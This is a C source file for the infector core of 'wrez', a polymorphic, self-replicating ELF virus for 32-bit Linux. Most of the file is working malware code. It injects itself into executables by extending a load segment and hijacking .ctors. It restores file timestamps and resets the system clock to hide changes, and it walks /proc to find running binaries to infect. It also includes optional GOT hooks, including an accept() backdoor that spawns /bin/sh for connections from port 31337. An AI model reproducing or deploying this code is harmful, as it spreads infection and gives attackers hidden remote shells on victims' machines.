/* wrez infector core
 */

#include <elf.h>
#include "int80.h"
#include "int80-net.h"
#include "unistd.h"

#include "wrconfig.h"
#include "wrezdefs.h"
#include "fingerprint.h"
#include "lime-interface.h"
#include "lookup.h"

#include "common.c"
#include "wrutil.c"


#define WREZ_SIZE_COMP (cfg->cmprlen + cfg->decomp_len)


/* static prototypes plus the central wrez_main function
 */

int wrez_main (wrconfig *cfg);
static inline int isinfected (char *filename);
static inline void infect (wrconfig *cfg, char *filename, char *mvfile);
static unsigned int infect_image (wrconfig *cfg, unsigned char *dest,
	unsigned long int new_entry);
static inline void fixup_ctors (int vfd, unsigned long int old_addr,
	unsigned long int new_addr, unsigned int startseek,
	unsigned int lenseek);
static inline int look_user (wrconfig *cfg);
static inline int look_user_proc (wrconfig *cfg, char *t_proc,
	unsigned char *filename);
static int mmap (void  *start, long length, int prot, int flags,
	int fd, long offset);
unsigned int fp_get (void);


/* define-dependant prototypes
 */

#ifdef	LOOKUP_GOT_DEEP_REDIRECTION_EXAMPLE
static void ex_wrez_got_deep_redirect (wrconfig *cfg);
static int ex_wrez_malloc (int size);
#endif

#ifdef	LOOKUP_GOT_REDIRECTION_EXAMPLE
static void ex_wrez_got_redirect (wrconfig *cfg);
static int ex_wrez_got_test (char *toprint);
#endif

#ifdef	LOOKUP_LIBC_CALL_EXAMPLE
static void ex_wrez_libc_call (wrconfig *cfg);
#endif

#ifdef	LOOKUP_BACKDOOR_NETWORK_MAGIC
static void backdoor_network (wrconfig *cfg);
static int backdoor_network_accept (int s, void *addr, int addr_len);
int backdoor_network_check (int sock);
#define	MAGIC_PORT 31337
#endif


/* core infection function, doing all the work
 *
 * the return value controls the environment code in wrez.asm:
 *
 * == 0: erase all virus memory before passing control to host application
 * != 0: keep virus in memory forever
 */
int
wrez_main (wrconfig *cfg)
{
	char *		foo;	/* TODO: remove this ;) */
	char		initfilename[VICTIM_LEN];	/* temporary copy */
	wrdynconfig *	dcfg = &cfg->dyn.vcfg;


#ifdef	LOOKUP_LIBC_CALL_EXAMPLE
	ex_wrez_libc_call (cfg);
#endif

#ifdef	LOOKUP_GOT_REDIRECTION_EXAMPLE
	ex_wrez_got_redirect (cfg);
#endif

#ifdef	LOOKUP_GOT_DEEP_REDIRECTION_EXAMPLE
	ex_wrez_got_deep_redirect (cfg);
#endif

#ifdef	LOOKUP_BACKDOOR_NETWORK_MAGIC
	backdoor_network (cfg);
#endif

	/* first infection run
	 */
	if (cfg->dyn.vcfg.cnul != 0) {
		memcpy (initfilename, cfg->dyn.vinit.victim, VICTIM_LEN);

		/* if initial infection process passed us a configuration
		 * structure pointer, copy it.
		 */
		if (cfg->dyn.vinit.vcfgptr != NULL) {
			memcpy ((unsigned char *) &cfg->dyn.vcfg,
				(unsigned char *) cfg->dyn.vinit.vcfgptr,
				sizeof (cfg->dyn.vcfg));
		}

		/* now infect the initial victim, exit afterwards
		 */
		if (isinfected (initfilename) == 0)
			infect (cfg, initfilename, (char *) 0);

		return (1);
	}

	/* XXX: put runtime related stuff, such as GOT hook code in here
	 */


	/*** this is executed in all other infection runs (normal case)
	 */

	/* WRF_GENERATION_LIMIT */
	if (WRF_ISSET (dcfg->flags, WRF_GENERATION_LIMIT)) {
		/* this is already the last (infertile) generation
		 */
		if (dcfg->icount == 0)
			return (1);

		/* else just decrease icount, since if we won't propagate,
		 * then its not used anyway.
		 */
		dcfg->icount -= 1;
	}

#ifdef	FINGERPRINT
	/* WRF_GET_FINGERPRINT */
	if (WRF_ISSET (dcfg->flags, WRF_GET_FINGERPRINT)) {
		dcfg->curhost = fp_get ();
	}
#endif

	/* FIXME: this is testing code only, to test propagation
	 */
	if (isinfected (dcfg->xxx_temp) != 0) {
		STRINGPTR (foo, "infected\\n");
		write (2, foo, 9);
	} else {
		STRINGPTR (foo, "tmp");
		infect (cfg, dcfg->xxx_temp, (char *) foo);
	}

	return (1);
}


#ifdef	LOOKUP_GOT_DEEP_REDIRECTION_EXAMPLE
static void
ex_wrez_got_deep_redirect (wrconfig *cfg)
{
	char *		mallocstr;
	Elf32_Word *	mallocgot[8];
	Elf32_Word *	cgot;		/* correct got slot */
	void *		mymalloc;
	char *		sostr;


	STRINGPTR (mallocstr, "malloc");
	STRINGPTR (sostr, "shared-library.so");

	if (got_funcloc_array ((void *) cfg->elf_base, mallocstr, mallocgot, 8,
		sostr) != 1)
	{
		STRINGPTR (mallocstr, "got_funcloc_array != 1\\n");
		write (2, mallocstr, 24);

		return;
	}

	cgot = mallocgot[0];
	FUNCPTR (mymalloc, "ex_wrez_malloc");

	PTRINSTALL (mymalloc, *cgot, cgot, cfg);
	*cgot = (Elf32_Word) mymalloc;
}


static int
ex_wrez_malloc (int size)
{
	int		(* chain)(int);

	int		rval;
	char *		m;

	CHAINSTART(chain);

	STRINGPTR (m, "wrez_malloc\\n");
	write (2, m, 13);

	CHAINCALL;
	rval = chain (size);

	/* did the .got entry change? (lazy binding)
	 */
	CHAINEND;

	CHAINCALL;
	return (rval);
}
#endif


#ifdef	LOOKUP_GOT_REDIRECTION_EXAMPLE
static void
ex_wrez_got_redirect (wrconfig *cfg)
{
	char *		printfstr;
	Elf32_Word *	printf;
	void *		myprintf;


	STRINGPTR (printfstr, "printf");
	printf = got_funcloc ((void *) cfg->elf_base, printfstr);
	FUNCPTR (myprintf, "ex_wrez_got_test");

	if (printf != NULL) {
		PTRINSTALL (myprintf, *printf, printf, cfg);
		*printf = (Elf32_Word) myprintf;	/* overwrite .got entry */
	}
}


static int
ex_wrez_got_test (char *toprint)
{
	int		(* chain)(char *);

	int		rval;
	char *		m;


	CHAINSTART (chain);


	STRINGPTR (m, "wrez_got_test\\n");
	write (2, m, 14);

	rval = chain (toprint);

	/* did the .got entry change? (lazy binding)
	 */
	CHAINEND;

	return (rval);
}
#endif


#ifdef	LOOKUP_LIBC_CALL_EXAMPLE
static void
ex_wrez_libc_call (wrconfig *cfg)
{
	char *	systemf;
	char *	command;
	int	(*system)(char *);


	STRINGPTR (systemf, "system");
	STRINGPTR (command, "uname -a;id;");

	system = symbol_resolve ((void *) cfg->elf_base, systemf);
	if (system != NULL)
		system (command);
}
#endif


#ifdef	LOOKUP_BACKDOOR_NETWORK_MAGIC
static void
backdoor_network (wrconfig *cfg)
{
	char *		acceptstr;
	Elf32_Word *	acceptgot[8];
	int		acg_wk;	/* got walker */
	void *		bd_accept;


	memset (acceptgot, 0, sizeof (acceptgot));
	STRINGPTR (acceptstr, "accept");

	if (got_funcloc_array ((void *) cfg->elf_base, acceptstr, acceptgot, 8,
		NULL) == 0)
	{
		return;
	}

	FUNCPTR (bd_accept, "backdoor_network_accept");

	/* install all GOT redirections into the hook function as static data
	 */
	PTRINSTALL_ARRAY (bd_accept, *(acceptgot[0]), cfg, acceptgot, "8");

	for (acg_wk = 0 ; acg_wk < (sizeof (acceptgot) /
		sizeof (acceptgot[0])) && acceptgot[acg_wk] != NULL ;
		++acg_wk)
	{
		*(acceptgot[acg_wk]) = (Elf32_Word) bd_accept;
	}
}


static int
backdoor_network_accept (int s, void *addr, int addr_len)
{
	int		(* chain)(int, void *, int);
	int		retval;

	CHAINSTART_M (chain, 8, "8");

again:
	CHAINCALL;
	retval = chain (s, addr, addr_len);
	CHAINEND_M;

	/* check whether a socket has been caught, if so, call real backdoor
	 * function, else just bail out as the real accept did
	 *
	 * if it is a real backdoored connection, then try again, without
	 * looking suspecious
	 */
	if (retval >= 0) {
		if (backdoor_network_check (retval) != 0) {
			close (retval);

			goto again;
		}
	}

	CHAINCALL;
	return (retval);
}


/* return 0 if its no backdoored connection
 * return != 0 if it is
 */
int
backdoor_network_check (int sock)
{
	char *			argv[2];
	struct sockaddr_in	rm;	/* remote addr */
	socklen_t		rm_l = sizeof (rm);
	unsigned short		port;


	if (getpeername (sock, &rm, &rm_l) != 0)
		return (0);

	port = ((rm.sin_port & 0xff) << 8) | ((rm.sin_port & 0xff00) >> 8);
	if (port == MAGIC_PORT) {
		if (fork () != 0)
			return (1);
	} else
		return (0);

	/* backdoored child from hereon
	 */
	STRINGPTR (argv[0], "/bin/sh");
	argv[1] = NULL;
	dup2 (sock, 0);
	dup2 (sock, 1);
	dup2 (sock, 2);
	execve (argv[0], argv, NULL);
	_exit (0);

	return (0);
}

#endif


/* isinfected
 *
 * test whether executeable file `filename' is already infected by wrez.
 * this test may cause false-positives because we use no signature but a
 * property of the program headers that could appear in normal files, too.
 *
 * return 0 if the file is not infected yet
 * return != 0 if the file is either infected or we cannot tell (error?)
 *      1 = infected or false positive
 *     -1 = bug or cannot tell
 */

static int
isinfected (char *filename)
{
	int		vfd,
			rval = -1;	/* return value, assume infected */
	Elf32_Ehdr	veh;
	Elf32_Phdr	vph;


	vfd = open (filename, O_RDONLY, 0);
	if (vfd < 0)
		return (-1);

	if (read (vfd, &veh, sizeof (veh)) != sizeof (veh))
		goto bail;

	if (veh.e_ident[EI_MAG0] != ELFMAG0 ||
		veh.e_ident[EI_MAG1] != ELFMAG1 ||
		veh.e_ident[EI_MAG2] != ELFMAG2 ||
		veh.e_ident[EI_MAG3] != ELFMAG3)
		goto bail;

	if (veh.e_type != ET_EXEC || veh.e_machine != EM_386)
		goto bail;

	if (lseek (vfd, veh.e_phoff, SEEK_SET) == -1)
		goto bail;

	while (veh.e_phnum-- > 0) {
		if (read (vfd, &vph, sizeof (vph)) != sizeof (vph))
			goto bail;

		if (vph.p_type != PT_LOAD)
			continue;

		if (vph.p_flags != (PF_W | PF_R))
			continue;

		if (INFECTED_IS (vph.p_memsz)) {
			rval = 1;
		} else {
			rval = 0;	/* not infected */
		}

		goto bail;
	}

bail:	close (vfd);

	return (rval);
}


/* infect
 *
 * try to infect file `filename'. do not check whether it is already infected.
 *
 * our idea works like this:
 *  1. find the last physical PT_LOAD segment
 *  2. save everything behind that in the file
 *  3. extend last PT_LOAD segment and inject ourself there
 *  4. append everything saved behind us
 *  5. fixup addresses for data behind us, which we assume to be only the
 *     section header table and the .shstrtab section
 *  6. increase PT_LOAD segments physical size so we get mapped too
 *  7. redirect .ctors to our entry point so we seize control
 *
 * when mvfile is non-NULL, it is used to copy the file to this name before
 * infecting it in case we cannot open the `filename' read/write. it will
 * then infect the copy, unlinking the old file and then moving the mvfile to
 * the old filename. this is necessary when infecting running processes
 *
 * return in any case
 */

static inline void
infect (wrconfig *cfg, char *filename, char *mvfile)
{
	int		n,	/* temporary counter */
			vfd;	/* victim file descriptor */
	Elf32_Ehdr	veh;
	Elf32_Phdr	vph;
	unsigned int	vlen;	/* victim file length */

	Elf32_Phdr	vphlast;
	unsigned int	ph_lastofs = 0;	/* offset of _Phdr struct in file */
	unsigned int	ph_lastphys = 0;/* last byte touched by PT_LOAD seg */

	unsigned int	phtext_offset = 0,	/* used for .ctors scan */
			phtext_filesz = 0;

	unsigned char *	mbl;		/* memory block */
	unsigned int	mbl_len;	/* length */

	unsigned char *	dpoly;		/* destination buffer for poly */
	unsigned int	dpoly_len,	/* length of destination buffer */
			dpoly_used;	/* number of bytes used */
#if 0
	/* see below what this should be used for */
			img_ok_check;	/* magic value transport */
#endif

	Elf32_Shdr	seh;
	unsigned int	ctors_virt = 0;	/* virtual .ctors offset in process */
	unsigned int	old_wrctors;

	unsigned int	elf_base = 0,	/* virtual &elf_header[0] */
			old_elf_base;	/* temporary backup */

	unsigned int	new_entry,	/* new entry point */
			new_displ,	/* displacement new/old */
			lastmem = 0;	/* last used memory at all in file */
	unsigned char	wrchar = 0x00;	/* fill byte for .bss */

	struct stat	ost;		/* old stat of file */
	struct utimbuf	nutime;		/* new utime of infected file */
	struct timeval	otval,		/* current time (to change it back) */
			ntval;		/* new timeval of infected file */

	int		tfd = 0;	/* temporary fd for mvfile */
	unsigned char	tcopy[64];	/* copy buffer used */


	/* get timestamps to restore them afterwards
	 */
	if (stat (filename, &ost) == -1)
		return;

	vfd = open (filename, O_RDWR, 0);

	if (vfd < 0 && mvfile != NULL) {
		vfd = open (filename, O_RDONLY, 0);
		if (vfd < 0)
			return;

		/* use some innocent looking mode here, in case things go
		 * wrong later and the file sticks somewhere
		 */
		tfd = open (mvfile, O_CREAT | O_RDWR, 0755);
		if (tfd < 0)
			return;

		/* copy the old file (`filename', at vfd) to the newly created
		 * one (`mvfile', at tfd)
		 */
		while ((n = read (vfd, tcopy, sizeof (tcopy))) > 0)
			write (tfd, tcopy, n);

		/* in either case (error or not), close down the fd's used
		 */
		close (tfd);
		close (vfd);

		if (n < 0) {
			unlink (mvfile);
			return;
		}

#define	OPERATE_ON_COPY_MARKER	0xffff
		tfd = OPERATE_ON_COPY_MARKER;

		vfd = open (mvfile, O_RDWR, 0);
	}

	/* no chance, even with moving?
	 */
	if (vfd < 0)
		return;


	if (read (vfd, &veh, sizeof (veh)) != sizeof (veh))
		goto bail;

	/* find physical .ctors address
	 * requires section header table (.e_shoff != 0)
	 */
	if (veh.e_shoff == 0)
		goto bail;

	if (lseek (vfd, veh.e_shoff, SEEK_SET) == -1)
		goto bail;

	for (n = 0 ; n < veh.e_shnum ; ++n) {
		if (read (vfd, &seh, sizeof (seh)) != sizeof (seh))
			goto bail;

		/* XXX: .bss has to be zeroed out even in the rtld already.
		 *      hence we cannot activate through .ctors except we
		 *      provide a zeroed-out array over whole .bss. sucks.
		 */
		if (seh.sh_addr != 0 &&
			(seh.sh_offset + seh.sh_size) > lastmem)
		{
			lastmem = seh.sh_offset + seh.sh_size;
		}

		if (seh.sh_type != SHT_PROGBITS)
			continue;
		if (seh.sh_size != 8)
			continue;
		if (seh.sh_flags != (SHF_WRITE | SHF_ALLOC))
			continue;

		/* first occurance is the .ctors section, so write its
		 * physical position in the file down and abort search
		 */
		if (ctors_virt == 0)
			ctors_virt = seh.sh_addr;
	}

	/* failed to find .ctors section ?
	 */
	if (ctors_virt == 0)
		goto bail;


	/* read in program headers, and find the last physical one.
	 */
	if (lseek (vfd, veh.e_phoff, SEEK_SET) == -1)
		goto bail;

	for (n = 0 ; n < veh.e_phnum ; ++n) {
		if (read (vfd, &vph, sizeof (vph)) != sizeof (vph))
			goto bail;

		if (vph.p_type != PT_LOAD)
			continue;

		/* starting at zero == includes elf header
		 */
		if (vph.p_offset == 0) {
			elf_base = vph.p_vaddr;

			/* we save this to better limit down the .ctors
			 * calling code in the file. this may be especially
			 * important for very large and or weird (c++ ?) files
			 * since there may be multiple .ctors calling
			 * occurances. anyway, its better to not scan the
			 * entire file, but just the .text PT_LOAD segment
			 */
			phtext_offset = vph.p_offset;
			phtext_filesz = vph.p_filesz;
		}

		if ((vph.p_offset + vph.p_filesz) > ph_lastphys) {
			ph_lastphys = vph.p_offset + vph.p_filesz;
			memcpy ((void *) &vphlast, (void *) &vph,
				sizeof (vphlast));

			ph_lastofs = veh.e_phoff + n * veh.e_phentsize;
		}
	}

	/* get victim file length, and compute length of memory block to
	 * slide.
	 */
	vlen = lseek (vfd, 0, SEEK_END);
	mbl_len = vlen - ph_lastphys;

	mbl = (unsigned char *) mmap ((void *) 0x06000000,
		mbl_len, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

	lseek (vfd, ph_lastphys, SEEK_SET);
	if (read (vfd, mbl, mbl_len) != mbl_len)
		goto bail2;

	/* inject ourself at the end of the PT_LOAD segment:
	 *
	 * 0| datadatadata 1| \0\0\0\0\0\0\0 2| vdata 3| vpad 4|
	 *    +---.data--+    +----.bss----+
	 *
	 * 0| = ph_offset, with .data section
	 * 1| = ph_offset + old_ph_filesz, .bss section
	 * 2| = ph_offset + old_ph_memsz, virus data compressed
	 * 3| = ph_offset + new_ph_filesz, space for decompressed virus
	 * 4| = ph_offset + new_ph_memsz
	 */
	if (lseek (vfd, ph_lastphys, SEEK_SET) != ph_lastphys)
		goto bail2;

	if ((lastmem - ph_lastphys) > 0) {
		do {
			write (vfd, &wrchar, 1);
		} while (lseek (vfd, 0, SEEK_CUR) < lastmem);
	}

	/* compute new entry point
	 */
	new_entry = vphlast.p_vaddr + vphlast.p_memsz + sizeof (unsigned int);

	/* generate a new polymorphic version of the virus, and write it to
	 * the victim file
	 *
	 * steps: - write correct .ctors address in new image
	 *        - get memory for polymorph version
	 *        - generate the polymorph version
	 *        - write .ctors to file
	 *        - write it to the file
	 *        - free the memory
	 *        - restore the .ctors addresses
	 */
	old_wrctors = cfg->wr_oldctors;

	/* XXX: the crt0.o behaviour changed from where it required +4 offset
	 * adjusting to +0. FIXME: make a reliable algo */
	/* cfg->wr_oldctors = ctors_virt + 4; */
	cfg->wr_oldctors = ctors_virt;

	old_elf_base = cfg->elf_base;
	cfg->elf_base = elf_base;

	dpoly_len = WREZ_SIZE_COMP + 4096;
	dpoly = (unsigned char *) mmap ((void *) 0x07000000,
		dpoly_len, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);

	if ((int) dpoly == -1)
		goto bail2;

	dpoly_used = infect_image (cfg, dpoly, new_entry);

#ifdef DOES_NOT_WORK
/* FIXME: does not work because the virus copy generated here (at &dpoly[0]
	  is at a different address than in the final infected file. because
	  the poly engine (lime) has to know the final load-address of the
	  code, it is impossible to test the virus with it. too bad.
*/
	/* test whether polymorphistic code worked.
	 * this is a workaround, since the polyengine contains some small
	 * bugs which appear randomly and result in segfaults and illegal
	 * instructions. since we installed a signal handler for both, back
	 * in wrez.asm, if things go wrong here, we will pass control to
	 * the host executeable and the file will not be infected.
	 */
	__asm__ __volatile__ ("
		call *%%eax
		nop
		nop
		nop
		nop"
		: "=a" (img_ok_check) : "a" (dpoly));

	/* magic "worked" value. normally if something wents wrong, we do
	 * not even receive control anymore
	 */
	if (img_ok_check != 0x60504030)
		goto bail3;
#endif

	/* first write new .ctors, followed by the full polycode
	 */
	if (write (vfd, (void *) &new_entry, sizeof (unsigned int)) !=
		sizeof (unsigned int))
		goto bail3;

	if (write (vfd, (void *) dpoly, dpoly_used) != dpoly_used)
		goto bail3;

	munmap ((void *) dpoly, dpoly_len);

	cfg->elf_base = old_elf_base;
	cfg->wr_oldctors = old_wrctors;

	/* write back saved block and fixup absolute address in elf header
	 * lseek(vfd,0,SEEK_CUR) is the new last physical byte touched by
	 * the PT_LOAD segment
	 */
	new_displ = lseek (vfd, 0, SEEK_CUR) - ph_lastphys;
	if (write (vfd, (void *) mbl, mbl_len) != mbl_len)
		goto bail2;


	if (veh.e_shoff > ph_lastphys) {
		veh.e_shoff += new_displ;

		if (lseek (vfd, 0, SEEK_SET) == -1)
			goto bail2;
		if (write (vfd, (void *) &veh, sizeof (veh)) != sizeof (veh))
			goto bail2;
	}

	/* fixup section addresses in section header table
	 */
	if (lseek (vfd, veh.e_shoff, SEEK_SET) == -1)
		goto bail;

	for (n = 0 ; n < veh.e_shnum ; ++n) {
		if (read (vfd, &seh, sizeof (seh)) != sizeof (seh))
			goto bail2;

		switch (seh.sh_type) {
		case (SHT_NULL):
			break;
		default:
			/* did we move anything non-runtime related ?
			 */
			if (seh.sh_addr == 0 && seh.sh_offset >= ph_lastphys) {
				seh.sh_offset += new_displ;

				if (lseek (vfd, -sizeof(seh), SEEK_CUR) == -1)
					goto bail2;

				write (vfd, &seh, sizeof (seh));
			}
			break;
		}
	}

	/* patch last PT_LOAD segment header to load ourself into memory
	 * XXX: sizeof (unsigned int) is the ctors address we add.
	 */
	vphlast.p_filesz += sizeof (unsigned int) +
		dpoly_used + (lastmem - ph_lastphys);

	/* XXX: we need space for the decompression, exactly WREZ_SIZE bytes */
	if (vphlast.p_memsz < (vphlast.p_filesz + WREZ_SIZE - cfg->decomp_len))
		vphlast.p_memsz = vphlast.p_filesz +
			WREZ_SIZE - cfg->decomp_len;

	/* vphlast.p_memsz is the utter minimum we need for decompression and
	 * ourself. but we round it up a bit as infection marker. the macros
	 * INFECTED_SET and INFECTED_IS are used and can be tweaked for a good
	 * false-positive ratio.
	 */
	INFECTED_SET (vphlast.p_memsz);

	if (lseek (vfd, ph_lastofs, SEEK_SET) != ph_lastofs)
		goto bail2;
	if (write (vfd, &vphlast, veh.e_phentsize) != veh.e_phentsize)
		goto bail2;

	/* modify .ctors to make it call our virus on startup
	 */
	fixup_ctors (vfd, ctors_virt, new_entry - sizeof (unsigned int),
		phtext_offset, phtext_filesz);

	munmap ((void *) mbl, mbl_len);
	close (vfd);


	/* if we infected a copy because the original binary is running, we
	 * overwrite the original binary now (or at least try to ;)
	 */
	if (tfd == OPERATE_ON_COPY_MARKER) {
		if (unlink (filename) != 0) {
			unlink (mvfile);

			return;
		}

		/* original is removed now, copy our infected binary over
		 * it, then proceed as usual (restore filestamps and such)
		 */
		if (rename (mvfile, filename) != 0) {
			/* oops, we deleted the original binary, but fail now,
			 * thats not good :( hm.. at least leave no trace then
			 */
			unlink (mvfile);

			return;
		}
	}

	/* restore timestamps on file
	 */
	nutime.actime = ost.st_atime;
	nutime.modtime = ost.st_mtime;
	ntval.tv_sec = ost.st_ctime + 1;
	ntval.tv_usec = 0;

	if (utime (filename, &nutime) == -1)
		goto bail2;

	if (gettimeofday (&otval, 0) == -1)
		goto bail2;

	/* XXX: kludge, this will naturally fail when we are != uid 0
	 */
	if (settimeofday (&ntval, 0) == -1)
		goto bail2;

	chown (filename, ost.st_uid, ost.st_gid);

	/* TODO/FIXME: loop until correct time was set */
	settimeofday (&otval, 0);

	return;

bail3:	munmap ((void *) dpoly, dpoly_len);
bail2:	munmap ((void *) mbl, mbl_len);

bail:	close (vfd);
}


/* infect_image
 *
 * create a proper new polymorph image of the virus at `dest'. there must
 * be at least (4096 + virus-size) bytes at dest.
 *
 * return the number of bytes stored at dest
 */

static unsigned int
infect_image (wrconfig *cfg, unsigned char *dest, unsigned long int new_entry)
{
	unsigned int	dn = 0;

#ifdef POLYMORPHISM
	unsigned int	lime_len;

	dest[dn++] = 0x9c;	/* pushf */
	dest[dn++] = 0x60;	/* pusha */

	lime_len = lime_generate (cfg->wr_start, WREZ_SIZE_COMP,
		&dest[dn], new_entry + dn, 0x0);

	return (dn + lime_len);
#else
	dest[dn++] = 0x9c;	/* pushf */
	dest[dn++] = 0x60;	/* pusha */

	memcpy (&dest[dn], (void *) cfg->wr_start, WREZ_SIZE_COMP);

	return (WREZ_SIZE_COMP + 2);
#endif

}


/* fixup_ctors
 *
 * find and change any occurance of ctor walking code in crt0.o
 *
 * looks like:
 *	00007457:BBB4350508                     mov       ebx,080535B4   
 *	0000745C:833DB4350508FF                 cmp (d)   [+080535B4],-01
 *	00007463:740C                           je        file:00007471 =>[2]
 *	00007465:8B03                           mov       eax,[ebx]
 *	00007467:FFD0                           call (d)  eax
 *	00007469:83C3FC                         add (d)   ebx,-04  
 *	0000746C:833BFF                         cmp (d)   [ebx],-01
 *	0000746F:75F4                           jne       file:00007465
 *
 * file to scan for the code is already opened read-write at `vfd'. the old
 * address thats stored in the code right now is `old_addr', we replace with
 * `new_addr'. within the file, the possible space we should look at is from
 * `startseek' to (`startseek' + `lenseek')
 *
 * return in any case
 */

static inline void
fixup_ctors (int vfd, unsigned long int old_addr, unsigned long int new_addr,
	unsigned int startseek, unsigned int lenseek)
{
	int		n,		/* temporary buffer walker */
			count = 0;	/* times we have seen the address */
	unsigned int	spos;		/* filepos of &rbuf[0] */
	unsigned char	rbuf[256];	/* streaming read buffer */


	spos = startseek;

	/* XXX: this is a bit of a kludge when we approach the end of the
	 *      space we have to search, we read over it by max (256 - 3)
	 *      bytes. but thats ok.
	 */
	do {
		if (lseek (vfd, spos, SEEK_SET) == -1)
			return;

		if (read (vfd, rbuf, sizeof (rbuf)) == -1)
			return;

		for (n = 0; n < (sizeof (rbuf) - 3) ; ++n) {
			if (*((unsigned int *) &rbuf[n]) == old_addr) {
				if (lseek (vfd, spos + n, SEEK_SET) == -1)
					return;

				/* overwrite old static address with our
				 * address, then move ahead, over it
				 */
				write (vfd, &new_addr, sizeof (new_addr));
				n += 4;
				count++;
			}
		}

		spos += sizeof (rbuf) - 3;
	} while (count < 2 && spos < (startseek + lenseek));

	return;
}


/* look_user
 *
 * we are non-root, so our choices of infecting other binaries is limited.
 * the most effective way to infect binaries that will be started even
 * after reboots is to look for user-owned binaries. this is too time
 * consuming, so we do it another way:
 *
 * 1. get a list of every running process
 * 2. look whether the binary of the process is writeable by us
 * 3. try to infect the binary (which requires some workarounds, see below)
 *
 * return 0 in case no victim was found
 * return number of attempted infections (successful or failure) on success
 */

static inline int
look_user (wrconfig *cfg)
{
	int		infect_count = 0;	/* number of attempted */
	int		dfd;			/* directory file descriptor */
	unsigned char *	t_proc;

	struct dirent *	dwlk;			/* dirent walker */
	int		d_count,		/* getdents return value */
			d_proc;			/* processed data */
	unsigned char	d_data[4096];		/* temporary dirent data */


	STRINGPTR (t_proc, "/proc");

	dfd = open (t_proc, O_RDONLY, 0);
	if (dfd < 0)
		return (0);

	do {
		dwlk = (struct dirent *) d_data;
		d_count = getdents (dfd, dwlk, sizeof (d_data));

		for (d_proc = 0 ; d_proc < sizeof (d_data) &&
			d_proc < d_count && dwlk->d_reclen != 0 ;
			d_proc += dwlk->d_reclen)
		{
			look_user_proc (cfg, t_proc, dwlk->d_name);
			dwlk = (struct dirent *) (((unsigned char *) dwlk) +
				dwlk->d_reclen);
		}
	} while (d_count > 0);

	close (dfd);

	return (infect_count);
}


static inline int
look_user_proc (wrconfig *cfg, char *t_proc, unsigned char *filename)
{
	int		mapfd;
	unsigned char	tfname[128];
	unsigned char *	fwlk;
	char *		tfnp;


	for (fwlk = filename ; *fwlk != '\0' ; ++fwlk) {
		/* when its not a process-directory, return immediatly
		 */
		if (*fwlk < '0' || *fwlk > '9')
			return (0);
	}

	/* XXX: a bit messy way of constructing "/proc/<pid>/maps"
	 */
	memcpy (tfname, t_proc, 5);	/* "/proc" */
	tfname[5] = '/';		/* "/proc/" */
	memcpy (&tfname[6], filename, fwlk - filename);
	STRINGPTR (tfnp, "/maps");
	memcpy (&tfname[6 + fwlk - filename], tfnp, 6);

	/* open the mapfile and extract the binary path out of it
	 */
	mapfd = open (tfname, O_RDONLY, 0);
	if (mapfd < 0)
		return (0);

	/* read until first slash '/'
	 */
	fwlk = tfname;
	for (*fwlk = '\0' ; read (mapfd, fwlk, 1) == 1 && *fwlk != '/' ; )
		;

	/* empty maps (kernel processes)
	 */
	if (*fwlk == '\0') {
		close (mapfd);

		return (0);
	}

	for (++fwlk ; fwlk < &tfname[sizeof (tfname) - 1] &&
		read (mapfd, fwlk, 1) == 1 && *fwlk != '\n' ; ++fwlk)
		;
	*fwlk = '\0';

	close (mapfd);

	/* FINAL:XXX: remove this in final build */
	write (2, tfname, fwlk - tfname);
	write (2, "\n", 1);

	/* wow, after all this mess, we finally got the filename of a running
	 * process, lets see if its infected, if not, try to infect it
	 */
	if (isinfected (tfname) == 0) {
		STRINGPTR (tfnp, "clean\n");
		write (2, tfnp, 6);
	}

	return (0);
}


/* its in here because of register poorness, hence we recycle the stack
 * content and pass the pointer to it instead of trying to write a braindead
 * inlined version
 */

static int
mmap (void  *start, long length, int prot, int flags,
	int fd, long offset)
{
	long	ret;

	__asm__ __volatile__ (	"int	$0x80"
		: "=a" (ret)
		: "a" (__NR_mmap), "b" (&start));

	return (ret);
}

